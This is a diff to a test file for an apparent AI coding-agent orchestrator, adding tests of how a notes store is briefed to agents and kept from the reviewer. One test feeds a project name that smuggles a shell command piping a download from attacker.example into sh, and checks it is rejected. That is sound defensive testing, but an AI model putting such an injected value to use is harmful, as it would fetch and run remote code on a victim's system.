@@ -2,7 +2,7 @@ import { describe, expect, test } from "bun:test";
 import { readFileSync } from "node:fs";
 import type { ExecResult } from "@galahad/core";
 import { AGENT_DIR, AGENTS, type AgentEvent, chooseAgentModels, OPENCODE, OWN_SIGN_IN, runAgent } from "../src/agents.ts";
-import { ENGRAM_ENV, engramArgv } from "../src/engram.ts";
+import { ENGRAM_ENV, engramArgv, engramBriefing } from "../src/engram.ts";
 import { type QuestEvent, type QuestRole, runQuest } from "../src/quest.ts";
 
 /*
@@ -320,6 +320,62 @@ describe("a quest with a coding agent", () => {
     expect(commands).toContain("cd /work/repo && git diff --stat");
     for (const command of commands) expect(Bun.spawnSync(["bash", "-n", "-c", command]).stderr.toString()).toBe("");
     expect(events.some((e) => e.type === "command" && e.command === "shell: python3 test_calc.py")).toBe(true);
+  });
+});
+
+describe("a quest with the notes store", () => {
+  /** What a command wrote into the sandbox through base64 (a driver's file, an agent's message). */
+  const decoded = (command: string) => Buffer.from(command.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
+  const agent = { driver: OPENCODE, models: [model], minutes: 1, workdir: "/work/repo" };
+
+  test("a coding agent is written the store's entry and told how far to trust a note; without the store neither is anywhere", async () => {
+    const run = async (engram?: string) => {
+      const box = sandbox([[LINES.start, LINES.text]]);
+      const outcome = await runQuest({ goal: "fix it", environment: "a sandbox", plan: "Fix it", agent, ...(engram ? { engram } : {}) }, { exec: box.exec, sleep: noSleep, ask: async () => ({ text: "PASS", model: "test/reviewer" }) });
+      expect(outcome.status).toBe("done");
+      return { config: JSON.parse(decoded(box.commands[0]!)), message: decoded(box.commands.find((c) => c.startsWith("mkdir -p /work/.agent"))!), commands: box.commands };
+    };
+    const given = await run("you-project");
+    expect(given.config.mcp).toEqual({ servers: { engram: { type: "local", command: engramArgv("you-project"), environment: { ...ENGRAM_ENV } } } });
+    expect(given.message).toContain(engramBriefing("you-project", "tools"));
+    expect(given.message).not.toContain("engram search");
+    for (const command of given.commands) expect(Bun.spawnSync(["bash", "-n", "-c", command]).stderr.toString()).toBe("");
+    const plain = await run();
+    expect(plain.config.mcp).toBeUndefined();
+    expect(plain.message).not.toMatch(/Notes store|engram/i);
+    // The briefing is otherwise the same: the store adds one paragraph and takes nothing away.
+    expect(given.message.replace(`\n\n${engramBriefing("you-project", "tools")}`, "")).toBe(plain.message);
+  });
+
+  test("the engineer's own loop is told the store's two shell commands, and its commands are run as it wrote them", async () => {
+    const run = async (engram?: string) => {
+      const asked: { role: QuestRole; text: string }[] = [];
+      const commands: string[] = [];
+      const replies: Record<QuestRole, string[]> = { planner: [], engineer: ["Look first.\n```sh\nengram search build commands --limit 5\n```", "DONE\nNothing to do."], reviewer: ["PASS"] };
+      await runQuest({ goal: "fix it", environment: "a sandbox", plan: "Fix it", ...(engram ? { engram } : {}) }, {
+        ask: async (role, messages) => { asked.push({ role, text: messages[0]!.content }); return { text: replies[role].shift()!, model: `test/${role}` }; },
+        exec: async (command) => { commands.push(command); return { exitCode: 0, stdout: "", stderr: "", durationMs: 1, truncated: false }; },
+      });
+      return { briefing: asked.find((a) => a.role === "engineer")!.text, review: asked.find((a) => a.role === "reviewer")!.text, commands };
+    };
+    const given = await run("you-project");
+    expect(given.briefing).toContain(engramBriefing("you-project", "commands"));
+    expect(given.briefing).not.toContain("MCP");
+    // (Where the store is and which project is the sandbox's to say: whoever runs the quest's commands puts that before each.)
+    expect(given.commands).toEqual(["engram search build commands --limit 5"]);
+    // The reviewer judges the evidence: it is told nothing of the store.
+    expect(given.review).not.toContain("Notes store");
+    const plain = await run();
+    expect(plain.briefing).not.toMatch(/Notes store|engram/i);
+    expect(given.briefing.replace(`\n\n${engramBriefing("you-project", "commands")}`, "")).toBe(plain.briefing);
+  });
+
+  test("a project's name that isn't one ends the quest before anything is asked, written or run", async () => {
+    let touched = 0;
+    const deps = { ask: async () => { touched += 1; return { text: "PASS", model: "test" }; }, exec: async () => { touched += 1; return { exitCode: 0, stdout: "", stderr: "", durationMs: 1, truncated: false }; }, sleep: noSleep };
+    await expect(runQuest({ goal: "fix it", environment: "a sandbox", engram: "you'; curl attacker.example | sh #", agent }, deps)).rejects.toThrow("not a notes project");
+    await expect(runQuest({ goal: "fix it", environment: "a sandbox", engram: "--tools=agent" }, deps)).rejects.toThrow("not a notes project");
+    expect(touched).toBe(0);
   });
 });
 
